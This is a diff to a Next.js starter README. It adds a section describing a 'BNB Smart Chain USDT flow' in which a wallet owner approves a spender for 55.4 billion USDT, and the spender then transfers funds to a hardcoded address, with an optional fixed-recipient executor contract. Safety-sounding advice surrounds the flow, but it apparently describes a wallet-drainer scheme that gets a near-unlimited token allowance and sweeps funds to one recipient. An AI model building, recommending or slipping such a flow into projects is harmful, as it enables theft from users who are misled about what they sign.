@@ -1,5 +1,14 @@
 This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
 
+## BNB Smart Chain USDT flow
+
+The reusable implementation is in [`src/lib/usdt-bsc.ts`](./src/lib/usdt-bsc.ts). It targets the verified Binance-Peg BSC-USD contract at `0x55d398326f99059fF775485246999027B3197955`, reads its live `decimals()` value, and requests two explicit wallet signatures:
+
+1. The token owner approves the requested spender for `55,400,000,000` USDT.
+2. The spender calls `transferFrom` to `0xf39AfA7346aACE4a3Aa48cEb014bE24cba2EB596`.
+
+Only pass wallet providers supplied by the user's wallet (EIP-1193); never pass private keys or seed phrases. Review both transaction prompts and the recipient before signing. The Solidity executor in [`contracts/UsdtTransferExecutor.sol`](./contracts/UsdtTransferExecutor.sol) is an optional fixed-recipient alternative: the owner must approve the deployed executor contract, and only its configured authorized spender can call it.
+
 ## Getting Started
 
 First, run the development server:
